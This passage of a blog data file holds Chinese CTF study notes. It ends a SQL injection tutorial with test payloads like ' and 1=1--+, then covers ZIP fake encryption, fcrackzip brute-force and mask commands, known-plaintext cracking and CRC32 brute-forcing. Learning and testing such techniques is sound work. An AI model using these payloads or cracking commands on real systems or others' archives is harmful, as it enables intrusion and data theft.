语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异<br>如果满足以上三点，则可以判断该URL存在数字型注入。</p>\n<p><strong><em>2、字符型注入</em></strong><br>当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。<br>例如数字型语句：select * from table where id =3<br>则字符型如下：select * from table where name=’admin’<br>因此，在构造payload时通过闭合单引号可以成功执行语句：<br>测试步骤：<br>（1） 加单引号：select * from table where name=’admin’’<br>由于加单引号后变成三个单引号，则无法执行，程序会报错（需掌握php语言的一些知识）；<br>（2） 加 ’and 1=1 此时sql 语句为：select * from table where name=’admin’ and 1=1’ ,也无法进行注入，还需要通过注释符号将其绕过；<br>Mysql 有三种常用注释符：<br>–+注意，这种注释符后边有一个空格</p>\n<p>#通过#进行注释</p>\n<p>/* */ 注释掉符号内的内容</p>\n<p>因此，构造语句为：select * from table where name =’admin’ and 1=1–+’ 可成功执行返回结果正确；<br>（3） 加and 1=2— 此时sql语句为：select * from table where name=’admin’ and 1=2 –’则会报错<br>如果满足以上三点，可以判断该url为字符型注入。<br>习题持续更新。（未完待续。。。）</p>\n"},{"title":"zip知识点的部分总结！","date":"2020-04-08T07:04:05.000Z","photos":["https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(4).jpg.webp"],"_content":"\n\n\n﻿前言：写这篇博客很犹豫，毕竟是自学可能有很多错误的地方，望大佬指点！\n目录\n0×01.zip文件格式及伪加密\n\n0×02.暴力破解\n\n0×03.明文攻击\n\n0×04.CRC爆破\n\n**0×01.zip文件格式及伪加密**\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200420112851603.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n这就是一个zip文件的格式。\n\n```\n压缩源文件数据区：\n50 4B 03 04：这是头文件标记（0x04034b50） \n14 00：解压文件所需 pkware 版本 \n00 00：全局方式位标记（有无加密） \n08 00：压缩方式 \n20 9E：最后修改文件时间 \n66 4F：最后修改文件日期 \nF2 1B 0F 4A：CRC-32校验（4A0F1BF2）\n0E 00 00 00：压缩后尺寸 \n0C 00 00 00：未压缩尺寸\n08 00：文件名长度 \n00 00：扩展记录长度 \n66 6C 61 67 2E 74 78 74: 文件名（不定长）\n4B CB 49 4C AF 36 34 32 36 31 35 AB 05 00: 文件flag.txt压缩后的数据\n\n压缩源文件目录区：\n50 4B 01 02：目录中文件文件头标记(0x02014b50) \n1F 00：压缩使用的 pkware 版本\n14 00：解压文件所需 pkware 版本 \n00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）\n08 00：压缩方式\n20 9E：最后修改文件时间\n66 4F：最后修改文件日期 \nF2 1B 0F 4A：CRC-32校验（4A0F1BF2）\n0E 00 00 00：压缩后尺寸 \n0C 00 00 00：未压缩尺寸 \n08 00：文件名长度 \n24 00：扩展字段长度 \n00 00：文件注释长度\n00 00：磁盘开始号\n00 00：内部文件属性 \n20 00 00 00：外部文件属性 \n00 00 00 00：局部头部偏移量 \n50 4B 05 06：目录结束标记\n00 00：当前磁盘编号 \n00 00：目录区开始磁盘编号\n01 00：本磁盘上纪录总数\n01 00：目录区中纪录总数 \n5A 00 00 00：目录区尺寸大小 \n34 00 00 00：目录区对第一张磁盘的偏移量\n00 00 ：ZIP 文件注释长度\n\n```\n**伪加密：**\n第一行的七八位，00 00是没有加密。（从这里可以判断出是否为伪加密）\n第四行的十三，十四位00 00：全局方式位标记，有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了，这样就达到了zip伪加密的目的，可是这里又有一个疑问了，你可能会问，为什么改成09，而不是其他的数字呢，其实改成09只是举的一个例子，只要末位是奇数，就代表加密，反之，末位是偶数代表未加密，具体什么原理，可以去官网看一下。\n\n那么，如何辨别当前的zip是真的加密还是伪加密？\n\n无加密\n压缩源文件数据区的全局加密应当为00 00  （504B0304两个bytes之后）\n且压缩源文件目录区的全局方式位标记应当为00 00（504B0304四个bytes之后）\n\n假加密\n压缩源文件数据区的全局加密应当为00 00 \n且压缩源文件目录区的全局方式位标记应当为09 00\n\n真加密\n压缩源文件数据区的全局加密应当为09 00 \n且压缩源文件目录区的全局方式位标记应当为09 00 \n\n哦，对了。kail貌似可以直接打开伪加密的文件。\n\n知道了原理就可以解决问题了，如果是伪加密可以修改回来；但是要是真加密呐！咱们往下看。\n\n**0×02.暴力破解**\n\n说到暴力破解就要说到另外两个方法了。\n1. 爆破：顾名思义，逐个尝试选定集合中可以组成的所有密码，知道遇到正确密码（密码短的还好说，密码长的话可能一年半个月也破解不出来）\n2. 字典：字典攻击的效率比爆破稍高，因为字典中存储了常用的密码，因此就避免了爆破时把时间浪费在脸滚键盘类的密码上\n\n3.  掩码攻击：如果已知密码的某几位，如已知6位密码的第3位是a，那么可以构造 ??a??? 进行掩码攻击，掩码攻击的原理相当于构造了第3位为a的字典，因此掩码攻击的效率也比爆破高出不少\n\n暴力破解也可在kail里进行，软件为kali自带的fcrackzip\n使用步骤\n\n> fcrackzip -help\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200420152716363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n找到 上传压缩包所在文件目录,在此目录下进行操作\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200420152833895.png)\n> fcrackzip -b -c1 -l 1-4 -u 压缩文件 -v\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200420152928348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n对于以上方法，当然推荐一款神器AZPR\n爆破！\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200420141549683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n字典（合适的字典可以达到事半功倍的效果）！\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020042014161979.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n\n掩码攻击！\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200420141753909.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n**0×03.明文攻击**\n\n原理：明文攻击（Known plaintext attack）是一种攻击模式，指攻击者已知明文、密文及算法，求密钥的过程。\n同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件。\n\n在网上找到一个例题，链接：[这里](http://ctf5.shiyanbar.com/misc/no.zip)\n1解压这个zip文件，会得到flag.zip和tips.txt.提示“密码是十位大小写字母、数字、特殊符号组成的，你爆破的开么？！”\n这就尴尬了，想暴力破解？不可能！！！\n\n不多说拉进winhex分析一波。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200420153917942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n很明显 明文攻击 ！\n\n将明文tips.txt进行压缩，判断明文压缩后的CRC32是否与加密文件中的一致，若不一致可以换一个压缩工具。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200420154501231.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020042015450914.png)\n上工具AZPR！\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200420154555287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\nemmmmm 密码出来了。\n\n**0×04.CRC32爆破**\n原理：它的全称是循环冗余校验(Cyclic Redundancy Check, CRC)，用来校验文件是否出错但并不能用于自动纠错。CRC32则表示会产生一个32bit（8位十六进制数）的校验值。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020042015513465.png)\n注意：限于CPU的能力，CRC碰撞只能用于压缩文件较小的情况.\n神器：[CEC32](https://github.com/theonlypwner/crc32)\n使用方法：\n\n```\npython crc32.py reverse 你的crc32密文\n```\n具体的我也解释不清。\n[大佬文章](https://www.360zhijia.com/360anquanke/217342.html)\n\n持续更新！！！\n","source":"_posts/zip知识点的部分总结！.md","raw":"---\ntitle: zip知识点的部分总结！\ndate: 2020-04-08 15:04:05\ntags: zip知识学习\ncategories: 技术\nphotos: https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(4).jpg.webp\n---\n\n\n\n﻿前言：写这篇博客很犹豫，毕竟是自学可能有很多错误的地方，望大佬指点！\n目录\n0×01.zip文件格式及伪加密\n\n0×02.暴力破解\n\n0×03.明文攻击\n\n0×04.CRC爆破\n\n**0×01.zip文件格式及伪加密**\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200420112851603.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n这就是一个zip文件的格式。\n\n```\n压缩源文件数据区：\n50 4B 03 04：这是头文件标记（0x04034b50） \n14 00：解压文件所需 pkware 版本 \n00 00：全局方式位标记（有无加密） \n08 00：压缩方式 \n20 9E：最后修改文件时间 \n66 4F：最后修改文件日期 \nF2 1B 0F 4A：CRC-32校验（4A0F1BF2）\n0E 00 00 00：压缩后尺寸 \n0C 00 00 00：未压缩尺寸\n08 00：文件名长度 \n00 00：扩展记录长度 \n66 6C 61 67 2E 74 78 74: 文件名（不定长）\n4B CB 49 4C AF 36 34 32 36 31 35 AB 05 00: 文件flag.txt压缩后的数据\n\n压缩源文件目录区：\n50 4B 01 02：目录中文件文件头标记(0x02014b50) \n1F 00：压缩使用的 pkware 版本\n14 00：解压文件所需 pkware 版本 \n00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）\n08 00：压缩方式\n20 9E：最后修改文件时间\n66 4F：最后修改文件日期 \nF2 1B 0F 4A：CRC-32校验（4A0F1BF2）\n0E 00 00 00：压缩后尺寸 \n0C 00 00 00：未压缩尺寸 \n08 00：文件名长度 \n24 00：扩展字段长度 \n00 00：文件注释长度\n00 00：磁盘开始号\n00 00：内部文件属性 \n20 00 00 00：外部文件属性 \n00 00 00 00：局部头部偏移量 \n50 4B 05 06：目录结束标记\n00 00：当前磁盘编号 \n00 00：目录区开始磁盘编号\n01 00：本磁盘上纪录总数\n01 00：目录区中纪录总数 \n5A 00 00 00：目录区尺寸大小 \n34 00 00 00：目录区对第一张磁盘的偏移量\n00 00 ：ZIP 文件注释长度\n\n```\n**伪加密：**\n第一行的七八位，00 00是没有加密。（从这里可以判断出是否为伪加密）\n第四行的十三，十四位00 00：全局方式位标记，有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了，这样就达到了zip伪加密的目的，可是这里又有一个疑问了，你可能会问，为什么改成09，而不是其他的数字呢，其实改成09只是举的一个例子，只要末位是奇数，就代表加密，反之，末位是偶数代表未加密，具体什么原理，可以去官网看一下。\n\n那么，如何辨别当前的zip是真的加密还是伪加密？\n\n无加密\n压缩源文件数据区的全局加密应当为00 00  （504B0304两个bytes之后）\n且压缩源文件目录区的全局方式位标记应当为00 00（504B0304四个bytes之后）\n\n假加密\n压缩源文件数据区的全局加密应当为00 00 \n且压缩源文件目录区的全局方式位标记应当为09 00\n\n真加密\n压缩源文件数据区的全局加密应当为09 00 \n且压缩源文件目录区的全局方式位标记应当为09 00 \n\n哦，对了。kail貌似可以直接打开伪加密的文件。\n\n知道了原理就可以解决问题了，如果是伪加密可以修改回来；但是要是真加密呐！咱们往下看。\n\n**0×02.暴力破解**\n\n说到暴力破解就要说到另外两个方法了。\n1. 爆破：顾名思义，逐个尝试选定集合中可以组成的所有密码，知道遇到正确密码（密码短的还好说，密码长的话可能一年半个月也破解不出来）\n2. 字典：字典攻击的效率比爆破稍高，因为字典中存储了常用的密码，因此就避免了爆破时把时间浪费在脸滚键盘类的密码上\n\n3.  掩码攻击：如果已知密码的某几位，如已知6位密码的第3位是a，那么可以构造 ??a??? 进行掩码攻击，掩码攻击的原理相当于构造了第3位为a的字典，因此掩码攻击的效率也比爆破高出不少\n\n暴力破解也可在kail里进行，软件为kali自带的fcrackzip\n使用步骤\n\n> fcrackzip -help\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200420152716363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n找到 上传压缩包所在文件目录,在此目录下进行操作\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200420152833895.png)\n> fcrackzip -b -c1 -l 1-4 -u 压缩文件 -v\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200420152928348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n对于以上方法，当然推荐一款神器AZPR\n爆破！\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200420141549683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n字典（合适的字典可以达到事半功倍的效果）！\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020042014161979.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n\n掩码攻击！\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200420141753909.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n**0×03.明文攻击**\n\n原理：明文攻击（Known plaintext attack）是一种攻击模式，指攻击者已知明文、密文及算法，求密钥的过程。\n同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件。\n\n在网上找到一个例题，链接：[这里](http://ctf5.shiyanbar.com/misc/no.zip)\n1解压这个zip文件，会得到flag.zip和tips.txt.提示“密码是十位大小写字母、数字、特殊符号组成的，你爆破的开么？！”\n这就尴尬了，想暴力破解？不可能！！！\n\n不多说拉进winhex分析一波。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200420153917942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n很明显 明文攻击 ！\n\n将明文tips.txt进行压缩，判断明文压缩后的CRC32是否与加密文件中的一致，若不一致可以换一个压缩工具。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200420154501231.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020042015450914.png)\n上工具AZPR！\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200420154555287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\nemmmmm 密码出来了。\n\n**0×04.CRC32爆破**\n原理：它的全称是循环冗余校验(Cyclic Redundancy Check, CRC)，用来校验文件是否出错但并不能用于自动纠错。CRC32则表示会产生一个32bit（8位十六进制数）的校验值。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020042015513465.png)\n注意：限于CPU的能力，CRC碰撞只能用于压缩文件较小的情况.\n神器：[CEC32](https://github.com/theonlypwner/crc32)\n使用方法：\n\n```\npython crc32.py reverse 你的crc32密文\n```\n具体的我也解释不清。\n[大佬文章](https://www.360zhijia.com/360anquanke/217342.html)\n\n持续更新！！！\n","slug":"zip知识点的部分总结！","published":1,"updated":"2020-05-11T09:35:54.816Z","comments":1,"layout":"post","link":"","_id":"ckchhpsh800109kq6hi6a0qxa","content":"<p>﻿前言：写这篇博客很犹豫，毕竟是自学可能有很多错误的地方，望大佬指点！<br>目录<br>0×01.zip文件格式及伪加密</p>\n<p>0×02.暴力破解</p>\n<p>0×03.明文攻击</p>\n<p>0×04.CRC爆破</p>\n<p><strong>0×01.zip文件格式及伪加密</strong></p>\n<p><img src=\"https://img-blog.csdnimg.cn/20200420112851603.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>这就是一个zip文件的格式。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">压缩源文件数据区：</span><br><span class=\"line\">50 4B 03 04：这是头文件标记（0x04034b50） </span><br><span class=\"line\">14 00：解压文件所需 pkware 版本 </span><br><span class=\"line\">00 00：全局方式位标记（有无加密） </span><br><span class=\"line\">08 00：压缩方式 </span><br><span class=\"line\">20 9E：最后修改文件时间 </span><br><span class=\"line\">66 4F：最后修改文件日期 </span><br><span class=\"line\">F2 1B 0F 4A：CRC-32校验（4A0F1BF2）</span><br><span class=\"line\">0E 00 00 00：压缩后尺寸 </span><br><span class=\"line\">0C 00 00 00：未压缩尺寸</span><br><span class=\"line\">08 00：文件名长度 </span><br><span class=\"line\">00 00：扩展记录长度 </span><br><span class=\"line\">66 6C 61 67 2E 74 78 74: 文件名（不定长）</span><br><span class=\"line\">4B CB 49 4C AF 36 34 32 36 31 35 AB 05 00: 文件flag.txt压缩后的数据</span><br><span class=\"line\"></span><br><span class=\"line\">压缩源文件目录区：</span><br><span class=\"line\">50 4B 01 02：目录中文件文件头标记(0x02014b50) </span><br><span class=\"line\">1F 00：压缩使用的 pkware 版本</span><br><span class=\"line\">14 00：解压文件所需 pkware 版本 </span><br><span class=\"line\">00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）</span><br><span class=\"line\">08 00：压缩方式</span><br><span class=\"line\">20 9E：最后修改文件时间</span><br><span class=\"line\">66 4F：最后修改文件日期 </span><br><span class=\"line\">F2 1B 0F 4A：CRC-32校验（4A0F1BF2）</span><br><span class=\"line\">0E 00 00 00：压缩后尺寸 </span><br><span class=\"line\">0C 00 00 00：未压缩尺寸 </span><br><span class=\"line\">08 00：文件名长度 </span><br><span class=\"line\">24 00：扩展字段长度 </span><br><span class=\"line\">00 00：文件注释长度</span><br><span class=\"line\">00 00：磁盘开始号</span><br><span class=\"line\">00 00：内部文件属性 </span><br><span class=\"line\">20 00 00 00：外部文件属性 </span><br><span class=\"line\">00 00 00 00：局部头部偏移量 </span><br><span class=\"line\">50 4B 05 06：目录结束标记</span><br><span class=\"line\">00 00：当前磁盘编号 </span><br><span class=\"line\">00 00：目录区开始磁盘编号</span><br><span class=\"line\">01 00：本磁盘上纪录总数</span><br><span class=\"line\">01 00：目录区中纪录总数 </span><br><span class=\"line\">5A 00 00 00：目录区尺寸大小 </span><br><span class=\"line\">34 00 00 00：目录区对第一张磁盘的偏移量</span><br><span class=\"line\">00 00 ：ZIP 文件注释长度</span><br></pre></td></tr></table></figure>\n<p><strong>伪加密：</strong><br>第一行的七八位，00 00是没有加密。（从这里可以判断出是否为伪加密）<br>第四行的十三，十四位00 00：全局方式位标记，有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了，这样就达到了zip伪加密的目的，可是这里又有一个疑问了，你可能会问，为什么改成09，而不是其他的数字呢，其实改成09只是举的一个例子，只要末位是奇数，就代表加密，反之，末位是偶数代表未加密，具体什么原理，可以去官网看一下。</p>\n<p>那么，如何辨别当前的zip是真的加密还是伪加密？</p>\n<p>无加密<br>压缩源文件数据区的全局加密应当为00 00  （504B0304两个bytes之后）<br>且压缩源文件目录区的全局方式位标记应当为00 00（504B0304四个bytes之后）</p>\n<p>假加密<br>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为09 00</p>\n<p>真加密<br>压缩源文件数据区的全局加密应当为09 00<br>且压缩源文件目录区的全局方式位标记应当为09 00 </p>\n<p>哦，对了。kail貌似可以直接打开伪加密的文件。</p>\n<p>知道了原理就可以解决问题了，如果是伪加密可以修改回来；但是要是真加密呐！咱们往下看。</p>\n<p><strong>0×02.暴力破解</strong></p>\n<p>说到暴力破解就要说到另外两个方法了。</p>\n<ol>\n<li><p>爆破：顾名思义，逐个尝试选定集合中可以组成的所有密码，知道遇到正确密码（密码短的还好说，密码长的话可能一年半个月也破解不出来）</p>\n</li>\n<li><p>字典：字典攻击的效率比爆破稍高，因为字典中存储了常用的密码，因此就避免了爆破时把时间浪费在脸滚键盘类的密码上</p>\n</li>\n<li><p>掩码攻击：如果已知密码的某几位，如已知6位密码的第3位是a，那么可以构造 ??a??? 进行掩码攻击，掩码攻击的原理相当于构造了第3位为a的字典，因此掩码攻击的效率也比爆破高出不少</p>\n</li>\n</ol>\n<p>暴力破解也可在kail里进行，软件为kali自带的fcrackzip<br>使用步骤</p>\n<blockquote>\n<p>fcrackzip -help<br><img src=\"https://img-blog.csdnimg.cn/20200420152716363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>找到 上传压缩包所在文件目录,在此目录下进行操作<br><img src=\"https://img-blog.csdnimg.cn/20200420152833895.png\" alt=\"在这里插入图片描述\"><br>fcrackzip -b -c1 -l 1-4 -u 压缩文件 -v</p>\n</blockquote>\n<p><img src=\"https://img-blog.csdnimg.cn/20200420152928348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>对于以上方法，当然推荐一款神器AZPR<br>爆破！<br><img src=\"https://img-blog.csdnimg.cn/20200420141549683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>字典（合适的字典可以达到事半功倍的效果）！<br><img src=\"https://img-blog.csdnimg.cn/2020042014161979.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>掩码攻击！<br><img src=\"https://img-blog.csdnimg.cn/20200420141753909.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br><strong>0×03.明文攻击</strong></p>\n<p>原理：明文攻击（Known plaintext attack）是一种攻击模式，指攻击者已知明文、密文及算法，求密钥的过程。<br>同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件。</p>\n<p>在网上找到一个例题，链接：<a href=\"http://ctf5.shiyanbar.com/misc/no.zip\" target=\"_blank\" rel=\"noopener\">这里</a><br>1解压这个zip文件，会得到flag.zip和tips.txt.提示“密码是十位大小写字母、数字、特殊符号组成的，你爆破的开么？！”<br>这就尴尬了，想暴力破解？不可能！！！</p>\n<p>不多说拉进winhex分析一波。<br><img src=\"https://img-blog.csdnimg.cn/20200420153917942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>很明显 明文攻击 ！</p>\n<p>将明文tips.txt进行压缩，判断明文压缩后的CRC32是否与加密文件中的一致，若不一致可以换一个压缩工具。<br><img src=\"https://img-blog.csdnimg.cn/20200420154501231.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/2020042015450914.png\" alt=\"在这里插入图片描述\"><br>上工具AZPR！<br><img src=\"https://img-blog.csdnimg.cn/20200420154555287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>emmmmm 密码出来了。</p>\n<p><strong>0×04.CRC32爆破</strong><br>原理：它的全称是循环冗余校验(Cyclic Redundancy Check, CRC)，用来校验文件是否出错但并不能用于自动纠错。CRC32则表示会产生一个32bit（8位十六进制数）的校验值。<br><img src=\"https://img-blog.csdnimg.cn/2020042015513465.png\" alt=\"在这里插入图片描述\"><br>注意：限于CPU的能力，CRC碰撞只能用于压缩文件较小的情况.<br>神器：<a href=\"https://github.com/theonlypwner/crc32\" target=\"_blank\" rel=\"noopener\">CEC32</a><br>使用方法：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python crc32.py reverse 你的crc32密文</span><br></pre></td></tr></table></figure>\n<p>具体的我也解释不清。<br><a href=\"https://www.360zhijia.com/360anquanke/217342.html\" target=\"_blank\" rel=\"noopener\">大佬文章</a></p>\n<p>持续更新！！！</p>\n","site":{"data":{}},"excerpt":"","more":"<p>﻿前言：写这篇博客很犹豫，毕竟是自学可能有很多错误的地方，望大佬指点！<br>目录<br>0×01.zip文件格式及伪加密</p>\n<p>0×02.暴力破解</p>\n<p>0×03.明文攻击</p>\n<p>0×04.CRC爆破</p>\n<p><strong>0×01.zip文件格式及伪加密</strong></p>\n<p><img src=\"https://img-blog.csdnimg.cn/20200420112851603.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>这就是一个zip文件的格式。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span 